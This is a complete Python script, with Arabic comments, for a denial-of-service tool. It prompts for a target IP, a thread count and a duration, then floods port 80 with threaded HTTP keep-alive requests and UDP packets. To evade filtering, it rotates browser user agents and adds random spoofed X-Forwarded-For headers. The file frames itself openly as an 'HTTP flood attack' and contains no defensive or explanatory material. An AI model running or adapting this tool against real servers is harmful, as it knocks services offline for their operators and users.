import socket
import time
import random
import threading
from colorama import Fore, init

init()

def generate_fake_ip():
    # توليد عنوان IP عشوائي
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

def UAlist():
    return [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Edg/98.0.1108.62",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 YaBrowser/22.3.4 Yowser/2.5 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
    ]

def http(ip, floodtime):
    while time.time() < floodtime:
        fake_ip = generate_fake_ip()
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            try:
                sock.connect((ip, 80))
                while time.time() < floodtime:
                    user_agent = random.choice(UAlist())
                    request = f'GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {user_agent}\r\nX-Forwarded-For: {fake_ip}\r\nConnection: keep-alive\r\n\r\n'
                    sock.send(request.encode())
            except:
                sock.close()

def udp(ip, floodtime):
    while time.time() < floodtime:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            try:
                fake_ip = generate_fake_ip()
                # بدلاً من connect، قم بإرسال البيانات مباشرة
                request = f'GET / HTTP/1.1\r\nHost: {ip}\r\nX-Forwarded-For: {fake_ip}\r\n\r\n'
                sock.sendto(request.encode(), (ip, 80))
            except:
                pass

def attack(ip, port, threads, duration):
    end_time = time.time() + duration
    for _ in range(threads):
        threading.Thread(target=http, args=(ip, end_time)).start()
        threading.Thread(target=udp, args=(ip, end_time)).start()

def main():
    ip = input("Target IP: ")
    port = 80  # يمكنك تغيير البورت حسب الحاجة
    threads = int(input("Threads: "))
    duration = int(input("Attack Time (seconds): "))

    print(f"Launching HTTP flood attack on {ip} for {duration} seconds with {threads} threads...")
    attack(ip, port, threads, duration)

if __name__ == "__main__":
    main()